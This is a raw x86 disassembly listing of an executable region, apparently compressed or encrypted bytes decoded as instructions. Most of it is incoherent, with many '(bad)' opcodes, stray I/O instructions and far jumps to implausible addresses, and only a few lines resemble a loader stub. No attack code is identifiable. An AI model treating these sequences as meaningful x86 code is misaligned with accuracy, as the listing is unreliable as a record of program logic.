  40827f:	ins    DWORD PTR es:[edi],dx
  408280:	mov    bh,BYTE PTR [ebx+0x4dea4886]
  408286:	jmp    0x40821b
  408288:	test   BYTE PTR [edi+0x6c],cl
  40828b:	cld    
  40828c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40828d:	(bad)  
  40828e:	dec    edi
  40828f:	push   edi
  408290:	sbb    ah,dl
  408292:	xor    eax,0xaccef812
  408297:	adc    bh,BYTE PTR [edi]
  408299:	mov    WORD PTR [ebx],gs
  40829b:	or     DWORD PTR [eax+0x3cc465d1],0x52
  4082a2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082a4:	jne    0x4082b6
  4082a6:	aas    
  4082a7:	cli    
  4082a8:	inc    ebp
  4082a9:	xchg   ebx,eax
  4082aa:	mov    ds:0x8ee51596,al
  4082af:	ja     0x408305
  4082b1:	imul   eax,eax,0xffffffb9
  4082b4:	sahf   
  4082b5:	outs   dx,BYTE PTR ds:[esi]
  4082b6:	push   0x31
  4082b8:	xor    al,0x23
  4082ba:	ja     0x4082a2
  4082bc:	mov    al,ds:0x65266cdf
  4082c1:	aaa    
  4082c2:	mov    BYTE PTR [eax+eiz*8-0x1a3e45cd],dl
  4082c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082ca:	adc    ebp,DWORD PTR [edi]
  4082cc:	retf   
  4082cd:	scas   al,BYTE PTR es:[edi]
  4082ce:	bound  edx,QWORD PTR [ebp+0x26]
  4082d1:	sahf   
  4082d2:	inc    esi
  4082d3:	mov    esp,cs
  4082d5:	mov    DWORD PTR [edx],esp
  4082d7:	jmp    0x23927cb9
  4082dc:	data16 loop 0x408313
  4082df:	int3   
  4082e0:	sbb    al,0xd7
  4082e2:	call   esi
  4082e4:	data16 int 0x4e
  4082e7:	fdivr  DWORD PTR ds:0x7a264f20
  4082ed:	push   eax
  4082ee:	repz inc edi
  4082f0:	push   ebp
  4082f1:	jbe    0x408290
  4082f3:	inc    eax
  4082f4:	and    al,0xff
  4082f6:	or     eax,0xb1910952
  4082fb:	pop    esi
  4082fc:	adc    cl,BYTE PTR [esi-0x28]
  4082ff:	pop    ss
  408300:	push   ss
  408301:	(bad)  
  408302:	leave  
  408303:	loop   0x408311
  408305:	dec    esp
  408306:	add    al,bh
  408308:	add    BYTE PTR [ebx+0x70],0x2
  40830c:	add    cl,0x7a
  40830f:	rol    ebx,1
  408311:	pop    edi
  408312:	xor    edi,DWORD PTR [esi+0x38]
  408315:	loop   0x4082e2
  408317:	push   0xffffffb2
  408319:	popf   
  40831a:	inc    ebp
  40831b:	call   0x40:0xead81738
  408322:	inc    edx
  408323:	aaa    
  408324:	je     0x4082f3
  408326:	or     DWORD PTR [ebx],esp
  408328:	cmp    eax,0xa42ab9f0
  40832d:	out    0xcb,al
  40832f:	ret    0xb72d
  408332:	jecxz  0x408312
  408334:	sub    eax,0x1f38c307
  408339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40833a:	or     DWORD PTR [edi],0x84dc5670
  408340:	xor    ecx,ebx
  408342:	sub    BYTE PTR [edx-0x60dd3918],dl
  408348:	lahf   
  408349:	repz imul ebx,DWORD PTR [eax],0x1
  40834d:	imul   ecx,ebp,0xb905a8d4
  408353:	mov    ah,0x55
  408355:	mov    ah,0xdf
  408357:	mov    eax,ds:0xa152d67b
  40835c:	dec    ebp
  40835d:	out    0x8b,eax
  40835f:	call   0x53bb2953
  408364:	retf   
  408365:	hlt    
  408366:	jmp    0x3983:0x949d9e33
  40836d:	push   esp
  40836e:	adc    bh,BYTE PTR [edx-0x19]
  408371:	cli    
  408372:	jge    0x4083c8
  408374:	nop
  408375:	jb     0x4083e2
  408377:	xchg   esp,eax
  408378:	scas   al,BYTE PTR es:[edi]
  408379:	and    DWORD PTR [ecx],esp
  40837b:	push   edi
  40837c:	mov    ax,ds:0xbcd14d44
  408382:	fst    st(3)
  408384:	out    0x3c,eax
  408386:	fiadd  DWORD PTR [edi+0x30c83aae]
  40838c:	retf   0xba54
  40838f:	sbb    eax,0x2ef2270
  408394:	pop    ss
  408395:	test   al,0x6c
  408397:	dec    DWORD PTR [edx+eax*1-0x3c48002]
  40839e:	aaa    
  40839f:	adc    dh,cl
  4083a1:	xor    cl,BYTE PTR [ecx]
  4083a3:	jno    0x4083e3
  4083a5:	mov    ebp,0x523530aa
  4083aa:	cmc    
  4083ab:	out    0xb8,al
  4083ad:	dec    esi
  4083ae:	shr    DWORD PTR [esi],0xd5
  4083b1:	mov    bh,0xd6
  4083b3:	(bad)
  4083b8:	pop    ebp
  4083b9:	in     eax,dx
  4083ba:	adc    eax,0x72bdd570
  4083bf:	mov    bl,0xdb
  4083c1:	sub    edx,ebx
  4083c3:	mov    cs,WORD PTR [ebp-0x23]
  4083c6:	test   eax,0x1d55d259
  4083cb:	sub    al,0x8b
  4083cd:	sbb    al,0x60
  4083cf:	mov    ch,BYTE PTR [edi+ebx*8]
  4083d2:	in     eax,0xaf
  4083d4:	mov    DWORD PTR [eax+0x2b],ecx
  4083d7:	pushf  
  4083d8:	and    ah,bl
  4083da:	dec    eax
  4083db:	leave  
  4083dc:	ins    DWORD PTR es:[edi],dx
  4083dd:	mov    eax,ebp
  4083df:	xchg   BYTE PTR [eax-0x22],bl
  4083e2:	loope  0x40837e
  4083e4:	pusha  
  4083e5:	dec    ebx
  4083e6:	stc    
  4083e7:	cld    
  4083e8:	sbb    ch,BYTE PTR [ecx+0x6b]
  4083eb:	mov    esi,0x4ff8656
  4083f0:	cmp    BYTE PTR [esp+ebx*4-0x58],dl
  4083f4:	push   es
  4083f5:	pop    ebp
  4083f6:	fisubr WORD PTR [ecx-0x18]
  4083f9:	fadd   QWORD PTR [esi]
  4083fb:	cmp    eax,0x83c084bf
  408400:	and    eax,0x98aa60e1
  408405:	sub    BYTE PTR [ebx+0x4430d8cf],dl
  40840b:	ja     0x408440
  40840d:	jg     0x408430
  40840f:	adc    cl,0x96
  408412:	or     eax,0x7057ff22
  408417:	out    dx,al
  408418:	push   edx
  408419:	mov    edi,0x9bda6546
  40841e:	jb     0x40845b
  408420:	add    eax,0xe510c8f8
  408425:	cmp    esi,0x58
  408428:	sub    al,0xbe
  40842a:	(bad)  
  40842b:	std    
  40842c:	ret    
  40842d:	popf   
  40842e:	dec    eax
  40842f:	test   cl,0x8f
  408432:	int3   
  408433:	fucom  st(5)
  408435:	mov    esp,0xd09da0df
  40843a:	xor    ah,BYTE PTR [eax+0x29]
  40843d:	icebp  
  40843e:	in     eax,dx
  40843f:	test   eax,0xd69c4f95
  408444:	xor    DWORD PTR [esi-0x54],ebp
  408447:	out    dx,al
  408448:	or     BYTE PTR [esi-0x4b],al
  40844b:	jb     0x4084bf
  40844d:	fist   WORD PTR [esi]
  40844f:	pop    edx
  408450:	xchg   ecx,eax
  408451:	add    eax,0xbb3cb0c8
  408456:	out    dx,al
  408457:	jbe    0x4084c9
  408459:	fistp  WORD PTR [eax]
  40845b:	cmp    DWORD PTR gs:[edx-0x28aed649],0xffffffa6
  408463:	ja     0x408424
  408465:	push   eax
  408466:	or     al,0xba
  408468:	jmp    0x408498
  40846a:	loope  0x408478
  40846c:	mov    cl,0x63
  40846e:	addr16 cli 
  408470:	xchg   esi,eax
  408471:	pop    ebp
  408472:	sbb    al,0x9d
  408474:	mov    edx,0x511d6af6
  408479:	mov    esp,0x6110934f
  40847e:	clc    
  40847f:	add    esi,esp
  408481:	int3   
  408482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408483:	or     ebp,edi
  408485:	call   0x48c6:0xa636e875
  40848c:	rcl    BYTE PTR [ebp+0x7f70984f],0xa9
  408493:	pop    eax
  408494:	adc    DWORD PTR [edi+edi*8],ecx
  408497:	mov    edi,0x78fc0059
  40849c:	pop    edx
  40849d:	or     dh,al
  40849f:	loop   0x408429
  4084a1:	adc    DWORD PTR [edx+0x70],edx
  4084a4:	jle    0x4084a6
  4084a6:	mov    dh,0x9d
  4084a8:	xlat   BYTE PTR ds:[ebx]
  4084a9:	bound  edi,QWORD PTR [esi+0x6b]
  4084ac:	dec    ebx
  4084ad:	stc    
  4084ae:	cwde   
  4084af:	adc    al,0x82
  4084b1:	test   DWORD PTR [eax-0x63a53ec8],esi
  4084b7:	dec    ecx
  4084b8:	jmp    0x408471
  4084ba:	ins    DWORD PTR es:[edi],dx
  4084bb:	mov    cl,0xe5
  4084bd:	out    0x4,eax
  4084bf:	pop    es
  4084c0:	mov    al,0xb6
  4084c2:	push   ecx
  4084c3:	adc    dh,BYTE PTR [ecx]
  4084c5:	rcl    BYTE PTR [ecx-0x67],cl
  4084c8:	in     al,dx
  4084c9:	or     al,0xa7
  4084cb:	xchg   DWORD PTR [eax+0x34],ebp
  4084ce:	(bad)  
  4084cf:	fldenv [ebx+0x6246d5e8]
  4084d5:	mov    ebp,0xd87a78ac
  4084da:	sti    
  4084db:	pop    ebp
  4084dc:	inc    ebp
  4084dd:	pop    ecx
  4084de:	pop    ebp
  4084df:	ja     0x40848f
  4084e1:	mov    al,ds:0xd6cde644
  4084e6:	xchg   ebx,eax
  4084e7:	inc    ecx
  4084e8:	inc    edi
  4084e9:	or     eax,0x51ad067d
  4084ee:	mov    ds:0x3d4d1d98,al
  4084f3:	mov    ecx,0x2a404125
  4084f8:	push   edx
  4084f9:	cld    
  4084fa:	jmp    0xe27a:0x4c8320fa
  408501:	xchg   ecx,eax
  408502:	cli    
  408503:	cmp    ebp,DWORD PTR [ecx-0x63]
  408506:	out    0xb,eax
  408508:	mov    ecx,0x692845ea
  40850d:	mov    esi,edx
  40850f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408510:	bound  edi,QWORD PTR [ecx+eax*4]
  408513:	adc    bh,dh
  408515:	mov    ch,0xab
  408517:	push   esi
  408518:	in     al,0x87
  40851a:	out    dx,eax
  40851b:	mov    eax,0x4dffcfa4
  408520:	dec    BYTE PTR [edi]
  408522:	ss xchg ecx,eax
  408524:	and    ecx,ebp
  408526:	fisub  DWORD PTR [esi]
  408528:	js     0x40859d
  40852a:	lods   eax,DWORD PTR ds:[esi]
  40852b:	stos   BYTE PTR es:[edi],al
  40852c:	sahf   
  40852d:	fnsave [ecx]
  40852f:	push   eax
  408530:	mov    bl,0x90
  408532:	inc    ebp
  408533:	mov    eax,ds:0x2d1a2442
  408538:	jo     0x4084d2
  40853a:	fisubr WORD PTR [ebp-0x9b1d9ef]
  408540:	scas   al,BYTE PTR es:[edi]
  408541:	fcomp  DWORD PTR ds:0xfa9b4625
  408547:	add    dl,dh
  408549:	push   ds
  40854a:	aam    0x89
  40854c:	and    DWORD PTR [ebx+0x0],ebx
  40854f:	push   eax
  408550:	dec    esp
  408551:	lds    ebx,FWORD PTR [ecx-0xaf62530]
  408557:	ror    BYTE PTR [esi-0x419c5e11],1
  40855d:	aad    0x3f
  40855f:	pop    ebx
  408560:	(bad)  
  408561:	int3   
  408562:	xchg   ebp,eax
  408563:	ds dec eax
  408565:	or     DWORD PTR [eax+0x68],esi
  408568:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40856a:	sub    al,0x6b
  40856c:	in     al,dx
  40856d:	int    0x66
  40856f:	dec    edi
  408570:	mov    esp,0xd63ac11b
  408575:	(bad)  
  408576:	stc    
  408577:	scas   eax,DWORD PTR es:[edi]
  408578:	mov    edx,0x4ab5e1f
  40857d:	loope  0x4085cc
  40857f:	(bad)  
  408580:	icebp  
  408581:	dec    esi
  408582:	lahf   
  408583:	in     al,0x5
  408585:	bound  esp,QWORD PTR [eax-0x32]
  408588:	mov    dh,0x54
  40858a:	mov    esp,0x363725cc
  40858f:	fisttp DWORD PTR [eax-0x34]
  408593:	ret    
  408594:	cmp    al,0x9a
  408596:	(bad)  
  408597:	in     eax,0xf8
  408599:	retf   
  40859a:	int    0x82
  40859c:	das    
  40859d:	es pop eax
  40859f:	bnd ja 0x4085b4
  4085a2:	or     ah,al
  4085a4:	ret    
  4085a5:	sub    ebp,ebp
  4085a7:	loope  0x40860a
  4085a9:	cmp    eax,0x797b2757
  4085ae:	dec    edi
  4085af:	out    0xef,al
  4085b1:	pop    es
  4085b2:	ins    BYTE PTR es:[edi],dx
  4085b3:	adc    edi,DWORD PTR [esi+edx*4-0x7c640ec6]
  4085ba:	cmp    esi,edi
  4085bc:	int3   
  4085bd:	inc    edi
  4085be:	pop    esp
  4085bf:	adc    DWORD PTR [edi+edi*4+0x73],ebp
  4085c3:	mov    esp,0x7f8d7a8d
  4085c8:	out    0x71,al
  4085ca:	mov    al,ds:0x3a96ee22
  4085cf:	push   ebp
  4085d0:	mov    ebx,0x2091f2ef
  4085d5:	mov    eax,ds:0xd7b99e95
  4085da:	sub    ebp,DWORD PTR [edx]
  4085dc:	ret    
  4085dd:	cmp    eax,DWORD PTR [edx-0x48]
  4085e0:	leave  
  4085e1:	sar    ecx,cl
  4085e3:	dec    esp
  4085e4:	repz out dx,eax
  4085e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085e7:	cli    
  4085e8:	scas   eax,DWORD PTR es:[edi]
  4085e9:	inc    ebp
  4085ea:	push   edx
  4085eb:	fiadd  WORD PTR [esi]
  4085ed:	add    DWORD PTR [esi],edi
  4085ef:	loope  0x408608
  4085f1:	inc    eax
  4085f2:	push   0xffffffee
  4085f4:	and    dl,BYTE PTR [esi]
  4085f6:	and    bl,al
  4085f8:	rol    BYTE PTR [edx],cl
  4085fa:	cmp    DWORD PTR [ebp+0x26],0x62374cb1
  408601:	ret    
  408602:	xchg   edx,eax
  408603:	shr    BYTE PTR [esi],cl
  408605:	mov    bl,BYTE PTR [eax]
  408607:	mov    ds:0x2ace1462,al
  40860c:	pop    esp
  40860d:	scas   al,BYTE PTR es:[edi]
  40860e:	mov    bl,0x36
  408610:	or     esp,DWORD PTR [ebx+ecx*2-0x34]
  408614:	or     DWORD PTR [esi+0x62],ebx
  408617:	inc    edx
  408618:	jmp    0x4085ca
  40861a:	pop    edi
  40861b:	xor    eax,eax
  40861d:	cmp    esp,DWORD PTR [ebp+esi*4-0x422ea88c]
  408624:	or     BYTE PTR [ebp+0x3c],cl
  408627:	and    eax,0xcbf77113
  40862c:	mov    eax,0x542013cf
  408631:	cld    
  408632:	fwait
  408633:	std    
  408634:	pop    ebx
  408635:	rcr    esi,cl
  408637:	scas   eax,DWORD PTR es:[edi]
  408638:	(bad)  
  408639:	mov    dh,0x10
  40863b:	outs   dx,DWORD PTR ds:[esi]
  40863c:	ja     0x4085fa
  40863e:	pop    ebx
  40863f:	or     eax,0x13d86473
  408644:	xlat   BYTE PTR ds:[ebx]
  408645:	mov    ch,BYTE PTR [edi-0xe2c78fd]
  40864b:	or     esi,ebx
  40864d:	lea    ecx,[edx+edi*1]
  408650:	mov    esp,0x9643e593
  408655:	out    dx,eax
  408656:	scas   al,BYTE PTR es:[edi]
  408657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408658:	sbb    eax,0xe3b2f6d7
  40865d:	pop    ebp
  40865e:	mov    eax,esp
  408660:	(bad)  
  408661:	cmp    edx,DWORD PTR [ebp+0x6a]
  408664:	ret    
  408665:	inc    ecx
  408666:	push   ds
  408667:	push   ss
  408668:	add    ebx,DWORD PTR [esi-0x56]
  40866b:	mov    ds:0x86c13dfa,al
  408670:	sbb    DWORD PTR [ecx-0x5f],ebx
  408673:	aam    0xf9
  408675:	imul   BYTE PTR [ebp+0x6a1398ee]
  40867b:	test   DWORD PTR [ebx+0x8b2898a],ebp
  408681:	mov    esp,0x309885b9
  408686:	mov    ch,0x29
  408688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408689:	adc    al,BYTE PTR [eax]
  40868b:	xchg   esp,eax
  40868c:	adc    ecx,DWORD PTR [ebp+0x14]
  40868f:	jo     0x408629
  408691:	arpl   WORD PTR [eax+0x45],bp
  408694:	or     eax,0xf857bb19
  408699:	shl    BYTE PTR [edi],cl
  40869b:	cmp    al,0x14
  40869d:	or     ebx,DWORD PTR [eax-0x5c]
  4086a0:	mov    ds:0xa5ffc672,al
  4086a5:	arpl   WORD PTR [ecx-0x6d5f38fe],dx
  4086ab:	dec    edi
  4086ac:	xchg   ecx,eax
  4086ad:	enter  0x7022,0xd9
  4086b1:	xchg   DWORD PTR [ebx],eax
  4086b3:	imul   esp,DWORD PTR [esi-0x1b],0xe20ecf4b
  4086ba:	xchg   ebx,eax
  4086bb:	les    ecx,FWORD PTR [ebp+0x78]
  4086be:	jmp    0x4292:0xf410cb8b
  4086c5:	jmp    0x408661
  4086c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086c8:	outs   dx,BYTE PTR ds:[esi]
  4086c9:	ret    
  4086ca:	sahf   
  4086cb:	xor    BYTE PTR [ebp+0x78f0312d],0x56
  4086d2:	pop    ecx
  4086d3:	gs mov edx,0x6aee9ec9
  4086d9:	add    esi,DWORD PTR [ebx]
  4086db:	rcr    BYTE PTR [edx-0x7d],cl
  4086de:	ret    0x5208
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0x4c862f73
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  esi,QWORD PTR [esp+ebp*8+0x31cf9ff2]
  408724:	pop    ebx
  408725:	and    eax,DWORD PTR [ecx+0x59f7796c]
  40872b:	ss or  al,0xbb
  40872e:	jb     0x40871e
  408730:	sbb    BYTE PTR [edi-0x1c3a7140],0x40
  408737:	jmp    0xe0fc3665
  40873c:	lahf   
  40873d:	test   DWORD PTR [edx],ecx
  40873f:	mov    al,ds:0xb5ed0269
  408744:	(bad)  ds:0xce3f9589
  40874a:	pop    esp
  40874b:	jl     0x40872a
  40874d:	push   cs
  40874e:	xor    cl,BYTE PTR gs:[eax]
  408751:	clc    
  408752:	cs and al,0x3d
  408755:	enter  0x7b4b,0x87
  408759:	cmc    
  40875a:	sub    eax,0x36037861
  40875f:	and    al,BYTE PTR [edi]
  408761:	scas   eax,DWORD PTR es:[edi]
  408762:	pop    ds
  408763:	xchg   ebp,eax
  408764:	cvtps2pi mm0,QWORD PTR [ebp-0x34a8e1a3]
  40876b:	adc    eax,0xa5cf199a
  408770:	iret   
  408771:	xchg   edx,eax
  408772:	cli    
  408773:	int3   
  408774:	add    esp,DWORD PTR [edi]
  408776:	pusha  
  408777:	push   ecx
  408778:	les    edx,FWORD PTR [edi]
  40877a:	out    dx,al
  40877b:	ja     0x4087cf
  40877d:	js     0x408739
  40877f:	jb     0x40879a
  408781:	repz dec ecx
  408783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408784:	cvtdq2ps xmm7,XMMWORD PTR [edx-0x77123d8a]
  40878b:	inc    esi
  40878c:	xchg   bh,bl
  40878e:	jmp    0x40871c
  408790:	sbb    ch,BYTE PTR [esp+edx*4+0x180d7859]
  408797:	or     al,0x47
  408799:	inc    ebp
  40879a:	xchg   ecx,eax
  40879b:	mov    esi,0xe72f4ec4
  4087a0:	ret    0x4c41
  4087a3:	xchg   BYTE PTR [ebp-0x664c445c],cl
  4087a9:	out    dx,al
  4087aa:	dec    esi
  4087ab:	mov    dh,0x5e
  4087ad:	ja     0x408743
  4087af:	test   BYTE PTR ds:0xebb89fef,ch
  4087b5:	cmp    al,0x63
  4087b7:	lods   al,BYTE PTR ds:[esi]
  4087b8:	mov    bl,BYTE PTR [ebx-0x43f1f394]
  4087be:	xor    dl,al
  4087c0:	sbb    eax,0x2ecc018d
  4087c5:	es ret 
  4087c7:	jns    0x40882a
  4087c9:	(bad)  
  4087ca:	xchg   esi,eax
  4087cb:	leave  
  4087cc:	inc    esp
  4087cd:	jmp    0x408804
  4087cf:	xchg   esi,eax
  4087d0:	add    eax,0x2bc0618c
  4087d5:	(bad)  
  4087d6:	lock into 
  4087d8:	jne    0x4087b1
  4087da:	mov    ch,dl
  4087dc:	cmp    ch,BYTE PTR [edi-0xb2fecea]
  4087e2:	pop    edi
  4087e3:	push   0x386181ea
  4087e8:	inc    eax
  4087e9:	xchg   edx,eax
  4087ea:	pop    esp
  4087eb:	mov    cs,WORD PTR [edi-0xa179866]
  4087f1:	aam    0x7c
  4087f3:	pop    ebx
  4087f4:	cld    
  4087f5:	fild   WORD PTR [ecx]
  4087f7:	mov    ecx,0xf7252cb2
  4087fc:	scas   eax,DWORD PTR es:[edi]
  4087fd:	aas    
  4087fe:	sahf   
  4087ff:	jge    0x40884c
  408801:	repnz xor al,0xf4
  408804:	outs   dx,BYTE PTR ds:[esi]
  408805:	xchg   ebx,eax
  408806:	jle    0x408793
  408808:	jo     0x4087cd
  40880a:	pusha  
  40880b:	aas    
  40880c:	(bad)  
  40880d:	sbb    al,0x19
  40880f:	enter  0x655a,0x77
  408813:	jns    0x40888f
  408815:	xor    dl,dl
  408817:	cmp    eax,0x442dddad
  40881c:	sbb    al,0x4d
  40881e:	inc    ebx
  40881f:	jmp    0x6f6ca609
  408824:	adc    ch,BYTE PTR [ebp+0x136a244a]
  40882a:	dec    edi
  40882b:	push   0x7a00b174
  408830:	or     DWORD PTR [ecx],edx
  408832:	cmp    edi,DWORD PTR [ecx-0x650150fc]
  408838:	adc    bl,BYTE PTR [edi-0x60]
  40883b:	xlat   BYTE PTR ds:[ebx]
  40883c:	mov    ebx,0x289c6764
  408841:	aas    
  408842:	lds    esp,FWORD PTR [ebx-0x77705570]
  408848:	pusha  
  408849:	push   ebx
  40884a:	inc    esp
  40884b:	jmp    0x408825
  40884d:	gs pusha 
  40884f:	or     DWORD PTR [edi+0x6f],esp
  408852:	lods   eax,DWORD PTR ds:[esi]
  408853:	cmp    eax,0xfe0df359
  408858:	cmp    dh,BYTE PTR [esi+0x12a56762]
  40885e:	mov    al,ds:0x7793fec6
  408863:	pop    ds
  408864:	out    dx,eax
  408865:	add    eax,0x87b3a17d
  40886a:	push   ds
  40886b:	into   
  40886c:	loop   0x4088d1
  40886e:	shr    BYTE PTR [edx-0x5d2dfb11],0xb9
  408875:	imul   ebx,DWORD PTR [ebx],0x2401ee67
  40887b:	pop    ebp
  40887c:	stc    
  40887d:	stos   DWORD PTR es:[edi],eax
  40887e:	or     esi,DWORD PTR ss:[ecx-0xe]
  408882:	mov    eax,ds:0x83f891bb
  408887:	fucomi st,st(4)
  408889:	mov    ds:0xb818128d,eax
  40888e:	jmp    0x9727:0x15045fc
  408895:	(bad)  
  408896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408897:	pop    ss
  408898:	jnp    0x408906
  40889a:	push   esp
  40889b:	sub    al,BYTE PTR [esp+ecx*1+0x68]
  40889f:	ret    
  4088a0:	inc    edi
  4088a1:	inc    ebx
  4088a2:	es retf 0x7b34
  4088a6:	or     bl,dl
  4088a8:	(bad)  
  4088a9:	pop    ebx
  4088aa:	lods   al,BYTE PTR ds:[esi]
  4088ab:	sbb    ebp,DWORD PTR [eax-0x50]
  4088ae:	fyl2x  
  4088b0:	inc    esp
  4088b1:	jmp    0x801b:0x2993fc2c
  4088b8:	sub    al,0xc3
  4088ba:	mov    esi,0x14636940
  4088bf:	out    dx,eax
  4088c0:	mov    cl,al
  4088c2:	push   cs
  4088c3:	jle    0x4088c8
  4088c5:	pop    edx
  4088c6:	aam    0x57
  4088c8:	fldenv [ebp-0x2d]
  4088cb:	sbb    bh,dl
  4088cd:	pop    ebx
  4088ce:	ror    ch,cl
  4088d0:	sahf   
  4088d1:	sub    edx,DWORD PTR [ebx-0x20]
  4088d4:	push   edi
  4088d5:	xor    BYTE PTR [esi-0xd],dl
  4088d8:	dec    ecx
  4088d9:	outs   dx,DWORD PTR ds:[esi]
  4088da:	and    edi,DWORD PTR [ebx]
  4088dc:	xchg   ebp,eax
  4088dd:	lahf   
  4088de:	mov    ecx,0x5b6731a4
  4088e3:	test   BYTE PTR [eax+0x60edbd4c],dl
  4088e9:	outs   dx,DWORD PTR ds:[esi]
  4088ea:	mov    ebx,0xf9a22a42
  4088ef:	fcomp  st(7)
  4088f1:	cmova  ebp,DWORD PTR [ecx]
  4088f4:	popa   
  4088f5:	es ss scas eax,DWORD PTR es:[edi]
  4088f8:	sub    DWORD PTR [ecx],ebp
  4088fa:	jnp    0x408937
  4088fc:	(bad)  
  4088fd:	lahf   
  4088fe:	clc    
  4088ff:	in     eax,dx
  408900:	shr    DWORD PTR [ecx],cl
  408902:	xor    eax,0x121f0b18
  408907:	icebp  
  408908:	pop    edx
  408909:	sub    DWORD PTR [ebx],esi
  40890b:	push   eax
  40890c:	out    0xcb,al
  40890e:	(bad)
  408911:	repnz inc ebp
  408913:	jl     0x4088bb
  408915:	out    0xb2,al
  408917:	cli    
  408918:	call   0x3d82:0x94122a0b
  40891f:	add    DWORD PTR [edi-0x390cec34],ebp
  408925:	push   ebx
  408926:	inc    ebp
  408927:	les    esp,FWORD PTR [eax]
  408929:	dec    ebp
  40892a:	cmp    al,0x16
  40892c:	inc    ebp
  40892d:	pop    edi
  40892e:	jnp    0x408961
  408930:	push   esi
  408931:	idiv   DWORD PTR [ebx]
  408933:	cmp    esp,DWORD PTR [edx-0x5d]
  408936:	stos   BYTE PTR es:[edi],al
  408937:	mov    eax,ds:0xd0e1064a
  40893c:	enter  0xe674,0x75
  408940:	cli    
  408941:	pop    edx
  408942:	(bad)  
  408943:	xchg   ecx,eax
  408944:	sub    al,0x0
  408946:	and    dl,BYTE PTR [ebx-0x23]
  408949:	ficom  DWORD PTR [eax-0x148f408e]
  40894f:	pop    edi
  408950:	inc    ebx
  408951:	icebp  
  408952:	inc    esp
  408953:	sub    eax,0x1e108d57
  408958:	ret    0x8582
  40895b:	mov    dl,al
  40895d:	je     0x4089d9
  40895f:	add    bl,0x70
  408962:	and    al,0xbc
  408964:	stos   BYTE PTR es:[edi],al
  408965:	in     al,0xf0
  408967:	inc    edx
  408968:	aaa    
  408969:	pop    esi
  40896a:	addr16 mov dl,0x5e
  40896d:	gs jmp 0xd5b3b96
  408973:	adc    DWORD PTR ds:0xce234bf9,0xffffff99
  40897a:	nop
  40897b:	inc    esp
  40897c:	ds ret 
  40897e:	add    dl,al
  408980:	pop    edi
  408981:	in     eax,0x87
  408983:	pushf  
  408984:	retf   
  408985:	inc    ecx
  408986:	in     al,0x8a
  408988:	mov    esi,0x6ba6c6af
  40898d:	(bad)  
  40898e:	sub    BYTE PTR [ebx+0x21522486],al
  408994:	(bad)  
  408995:	aad    0x1d
  408997:	cs inc eax
  408999:	out    dx,al
  40899a:	int    0x46
  40899c:	adc    ch,BYTE PTR [eax+0x57]
  40899f:	mov    edx,0x4a0bb9a9
  4089a4:	xchg   ebx,eax
  4089a5:	dec    esi
  4089a6:	xor    al,0xdc
  4089a8:	push   esp
  4089a9:	mov    esi,0x1f8c3204
  4089ae:	call   0x2ff2:0xad5fbdad
  4089b5:	pop    ebp
  4089b6:	lahf   
  4089b7:	int3   
  4089b8:	(bad)  
  4089b9:	xchg   esi,eax
  4089ba:	les    ecx,FWORD PTR [esp+eiz*8+0x1a17f848]
  4089c1:	mov    ds:0x7909dda3,al
  4089c6:	and    eax,0x3dfe400e
  4089cb:	mov    cl,0xbf
  4089cd:	out    dx,al
  4089ce:	pop    ds
  4089cf:	(bad)  
  4089d0:	and    al,0x28
  4089d2:	or     BYTE PTR [ebp+0xd7a8650],cl
  4089d8:	call   0x792af4a2
  4089dd:	stc    
  4089de:	sbb    ebp,DWORD PTR [ecx+0x3dd10e3b]
  4089e4:	sbb    ebp,DWORD PTR [ebp+ebx*8+0x5298f067]
  4089eb:	daa    
  4089ec:	add    al,0x8
  4089ee:	sbb    eax,0x2b46ffaf
  4089f3:	sub    ebp,DWORD PTR [edx+0x3b]
  4089f6:	mov    edi,0x995cddb2
  4089fb:	jae    0x4089b2
  4089fd:	dec    esi
  4089fe:	(bad)  [ecx-0x10ffab15]
  408a04:	inc    eax
  408a05:	push   es
  408a06:	push   es
  408a07:	and    BYTE PTR [ecx-0x67],al
  408a0a:	div    bl
  408a0c:	mov    ah,0xa8
  408a0e:	mov    BYTE PTR [ecx-0x1641e8dd],0x13
  408a15:	jae    0x4089da
  408a17:	mov    bl,0x2a
  408a19:	xchg   ecx,eax
  408a1a:	jl     0x408a54
  408a1c:	pop    ebx
  408a1d:	jecxz  0x408a60
  408a1f:	leave  
  408a20:	or     dl,bh
  408a22:	aas    
  408a23:	push   ebp
  408a24:	mov    WORD PTR [esi-0x62c82e1e],ds
  408a2a:	mov    eax,0x842dcbe8
  408a2f:	not    edx
  408a31:	sbb    DWORD PTR [edx],ebp
  408a33:	cmp    DWORD PTR [edx],ecx
  408a35:	pop    es
  408a36:	cmp    al,0xab
  408a38:	mov    ecx,0x77aad2ed
  408a3d:	mov    dl,0x63
  408a3f:	ins    BYTE PTR es:[edi],dx
  408a40:	lea    ebp,[edx]
  408a42:	adc    eax,0xf5464312
  408a47:	dec    eax
